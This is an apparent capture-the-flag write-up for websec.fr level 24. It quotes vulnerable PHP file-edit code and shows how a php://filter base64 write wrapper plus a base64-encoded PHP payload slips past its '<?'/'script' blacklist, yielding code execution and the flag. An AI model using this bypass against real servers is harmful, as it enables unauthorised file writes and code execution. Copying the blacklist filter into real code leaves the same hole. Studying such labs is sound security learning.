+SOurce
```
if (isset($_GET['p']) && isset($_GET['filename']) ) {
    $filename = $_GET['filename'];
    if ($_GET['p'] === "edit") {
        $p = "edit";
        if (isset($_POST['data'])) {
            $data = $_POST['data'];
            if (strpos($data, '<?')  === false && stripos($data, 'script')  === false) {  # no interpretable code please.
                file_put_contents($_GET['filename'], $data);
                die ('<meta http-equiv="refresh" content="0; url=.">');
            }
        } elseif (file_exists($_GET['filename'])){
            $data = file_get_contents($_GET['filename']);
        }
    }
}
```
+ If the user has submitted new data for the file via a POST request, the script checks if the data contains interpretable code using strpos() and stripos(). If the data does not contain interpretable code, the script uses file_put_contents() to write the new data to the file specified in the filename parameter. The script then sends a meta refresh header to reload the page using <meta http-equiv="refresh" content="0; url=."> and terminates execution using die()
+ strpos():  finds the position of the first occurrence of a string inside another string.
+ stripos(): stripos() function is case-insensitive
+ Payload: asdf.php
After that we can insert content and save changes. We can access the file by clicking on the link and can make changes again if needed
+ We can try reading arbitrary files using php filters.
+ When we create a file the url will be like:
`https://websec.fr/level24/index.php?p=edit&filename=asdf.php`
+ Changing filename= php://filter/convert.base64-encode/resource=flag.php will create a new file named flag.php. Now we need to add contents to the file
+ We can add a php code to show the contents of the flag file inorder to get the flag.
```
<?php show_source('/flag.php');?>
```
+ Base64 encode the above code and give it as the content of flag.php
PD9waHAgc2hvd19zb3VyY2UoJy9mbGFnLnBocCcpOz8+
+ After successfully uploading, go to https://websec.fr/level24//uploads/un665jkbk3nvuen52qiru8gujvesham8/flag.php we will get the flag
Flag: WEBSEC{no_javascript_no_php_I_guess_you_used_COBOL_to_get_a_RCE_right?}

